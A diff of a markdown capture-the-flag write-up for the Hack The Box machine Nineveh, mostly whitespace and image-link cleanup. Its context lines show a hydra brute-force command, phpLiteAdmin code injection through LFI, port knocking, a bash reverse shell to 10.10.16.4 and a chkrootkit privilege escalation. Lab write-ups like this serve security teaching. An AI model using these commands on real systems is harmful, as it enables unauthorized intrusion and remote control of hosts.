@@ -62,11 +62,7 @@ Load the Website :
 
 Found /db lets check here : and its works !
 
-
-
-<figure><img src="../../../../.gitbook/assets/image (258).png" alt=""><figcaption></figcaption></figure>
-
-
+<figure><img src="../../../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>
 
@@ -132,8 +128,6 @@ I Tried everthing smtg is intresting is there
 
 <figure><img src="../../../../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ```powershell
 ┌──(sn0x㉿sn0x)-[~/hackthebox/Nineveh]
 └─$ searchsploit phpliteadmin
@@ -176,11 +170,7 @@ Examining each of these with `searchsploit -x [path]`, the first is a version ma
 
 This page is just an image:
 
-
-
-<figure><img src="../../../../.gitbook/assets/image (262).png" alt=""><figcaption></figcaption></figure>
-
-
+<figure><img src="../../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>
 
 **phpLiteAdmin Brute Force :**
 
@@ -196,7 +186,7 @@ hydra 10.10.10.43 -l sn0x -P /usr/share/seclists/Passwords/twitter-banned.txt ht
 
 This vulnerability leverages improper handling of database filenames and default values in `phpLiteAdmin`, allowing Remote Code Execution (RCE) by injecting PHP code into a `.php`-suffixed SQLite database.
 
-&#x20;**Exploitation Steps:**
+**Exploitation Steps:**
 
 1. **Create a Malicious Database**\
    Using `phpLiteAdmin`, create a new database file with a `.php` extension.\
@@ -223,13 +213,9 @@ This vulnerability leverages improper handling of database filenames and default
    At this stage, although the webshell exists, you need **Local File Inclusion (LFI)** to load `/var/tmp/shell.php` through a web-accessible route.\
    Without LFI, the payload cannot be executed via browser or HTTP request.
 
-
-
 Login :
 
 <figure><img src="../../../../.gitbook/assets/image (264).png" alt=""><figcaption></figcaption></figure>
-
-
 
 Now As indicated by the **Notes**, we need to poke around a bit until we find the right spot for the LFI.
 
@@ -237,11 +223,9 @@ use this payload :
 
 <figure><img src="../../../../.gitbook/assets/image (265).png" alt=""><figcaption></figcaption></figure>
 
-Result :&#x20;
+Result :
 
 <figure><img src="../../../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>
-
-
 
 Could this be the key to triggering our reverse shell? We ensure that our listener is running.
 
@@ -256,7 +240,7 @@ Using the command execution function, we attempt to establish a reverse shell wi
 
 ```
 
-On phpadmin page do thsi setting&#x20;
+On phpadmin page do thsi setting
 
 ### Goal:
 
@@ -355,15 +339,11 @@ You should now get a reverse shell on your netcat listener.
 
 <figure><img src="../../../../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>
 
-
-
 We’ve found a private RSA key, but our Nmap scan didn’t reveal an open SSH port. To investigate further, we use `netstat` to check all active connections. Also [**Port Knocking**](https://goteleport.com/blog/ssh-port-knocking/)
 
 **Knockd** is a program that opens an SSH connection only if a specific knock sequence is initiated, as shown below.
 
 <figure><img src="../../../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>
-
-
 
 <figure><img src="../../../../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>
 
@@ -397,7 +377,7 @@ bash -i >& /dev/tcp/10.10.16.4/8002 0>&1
 
 Finally, we make the `update` file executable with `chmod +x update`, and we can then collect all the flags.
 
-### &#x20;Final PrivEsc via chkrootkit (Exploit 33899)
+### Final PrivEsc via chkrootkit (Exploit 33899)
 
 ***
 
@@ -467,8 +447,8 @@ hostname
 
 ```
 
-And grab `/root/root.txt` flag&#x20;
+And grab `/root/root.txt` flag
 
 ***
 
-<figure><img src="../../../../.gitbook/assets/complete (14).gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
